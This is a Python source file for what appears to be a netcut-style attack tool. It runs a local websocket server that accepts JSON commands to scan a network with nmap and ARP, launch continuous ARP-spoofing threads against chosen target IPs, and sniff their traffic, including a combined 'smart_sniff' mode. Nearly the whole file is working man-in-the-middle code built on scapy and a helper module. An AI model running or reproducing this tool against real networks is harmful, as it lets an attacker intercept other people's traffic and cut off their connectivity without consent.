import asyncio, websockets, json, time, threading
import netcututils as nc
from scapy.all import *


defaultGateway = "192.168.0.254"
spoofed = []
sniffed = []
spoofingThread = []
sniffingThread = []

def spoof(target_ip, gateway_ip):
    t = threading.currentThread()
    packet = nc.craft_arp_spoof(target_ip, gateway_ip)

    while getattr(t, "do_run", True):
        send(packet, verbose = False)
        
    time.sleep(1) #Optionnal

    # Reset the network back to its initial state (this is basically a correct ARP packet from a gateway to a target)
    send(ARP(op = 2, psrc = gateway_ip, hwsrc = getmacbyip(gateway_ip), pdst = target_ip, hwdst = getmacbyip(target_ip)))

def sniff(target_ip, gateway_ip):
    t = threading.currentThread()
    nc.sniffing(target_ip, gateway_ip)


    

async def process(websocket, path):
    
    async for message in websocket:
        print(message)
        request = json.loads(message)
        print(request)
        if request[0] == "nmap_scan":

            if len(request) == 1:
                await websocket.send(json.dumps(nc.nmap_scan()))
            elif len(request) > 1:
                await websocket.send(json.dumps(nc.nmap_scan(request[1])))

        elif request[0] == "arp_scan":

            if len(request) == 1:
                # await websocket.send(json.dumps(nc.arp_scan()))
                print(json.dumps(nc.arp_scan()))
            elif len(request) > 1:
                await websocket.send(json.dumps(nc.arp_scan(request[1])))

        elif request[0] == "arp_spoof":

            if len(request) > 2 and spoofed.count(request[1]) < 1 :
                spoofed.append(request[1])
                t = threading.Thread(target=spoof, args=(request[1], request[2]))
                spoofingThread.insert(spoofed.index(request[1]), t)
                t.start()

            elif len(request) == 2 and spoofed.count(request[1]) < 1 :
                spoofed.append(request[1])
                t = threading.Thread(target=spoof, args=(request[1], defaultGateway))
                spoofingThread.insert(spoofed.index(request[1]), t)

                t.start()
            else:
                await websocket.send(json.dumps("Error : number of argument supplied is not correct"))



        elif request[0] == "sniff":
            if len(request) == 2:
                sniffed.append(request[1])
                t = threading.Thread(target=sniff, args=(request[1], defaultGateway))
                sniffingThread.insert(sniffed.index(request[1]), t)
                t.start()
            if len(request) > 2:
                sniffed.append(request[1])
                t = threading.Thread(target=sniff, args=(request[1], request[2]))
                sniffingThread.insert(sniffed.index(request[1]), t)
                t.start()
            else:
                await websocket.send(json.dumps("Error: number of argument supplied is not equal to 2"))

        elif request[0] == "set_gateway":
            this.defaultGateway = request[1]   

        elif request[0] == "spoof_stop":
            t = spoofingThread[spoofed.index(request[1])]
            spoofed.remove(request[1])
            t.do_run = False
            t.join()

        elif request[0] == "sniff_stop":
            t = sniffingThread[sniffed.index(request[1])]
            sniffed.remove(request[1])
            t.do_run = False
            t.join()
        elif request[0] =="get_spoofed":
            await websocket.send(json.dumps(spoofed))
        elif request[0] =="get_sniffed":
            await websocket.send(json.dumps(sniffed))

        elif request[0] == "smart_sniff":
            if len(request) > 2 and not request[1] in spoofed and not request[1] in sniffed:
                spoofed.append(request[1])
                sniffed.append(request[1])
                nc.smart_sniff(request[1], request[2])

            elif len(request) == 2 and not request[1] in spoofed and not request[1] in sniffed:
                spoofed.append(request[1])
                sniffed.append(request[1])
                nc.smart_sniff(request[1], defaultGateway)

            else:
                await websocket.send(json.dumps("Error number of argument supplied is not correct"))



        else:
            await websocket.send("this request doesn't exist")
        
# Server launch, starting with the 'process' function
asyncio.get_event_loop().run_until_complete(
    websockets.serve(process, 'localhost', 8765))
asyncio.get_event_loop().run_forever()





